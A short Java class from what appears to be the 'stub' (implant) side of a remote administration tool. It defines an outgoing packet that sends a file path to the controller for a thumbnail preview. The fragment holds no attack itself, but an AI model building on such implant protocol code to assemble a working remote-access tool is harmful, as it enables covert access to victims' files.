package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;
import com.redpois0n.stub.Connection;

public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
	
	private String file;

	public Packet59ThumbnailPreview(String file) {
		this.file = file;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file);
		
		Connection.lock();
	}

	@Override
	public byte getPacketId() {
		return 59;
	}

}
